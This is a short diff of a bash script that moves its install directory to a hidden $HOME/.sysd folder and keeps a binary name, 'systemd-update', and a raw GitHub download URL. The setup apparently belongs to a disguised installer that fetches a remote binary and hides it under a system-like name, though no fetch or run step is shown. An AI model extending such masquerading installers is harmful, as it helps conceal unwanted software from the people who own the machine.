@@ -1,6 +1,6 @@
 #!/bin/bash
 
-DIR="/opt/.sysd"
+DIR="$HOME/.sysd"
 BIN="systemd-update"
 GITHUB="https://raw.githubusercontent.com/ThipyThipy/machinee/main"
 
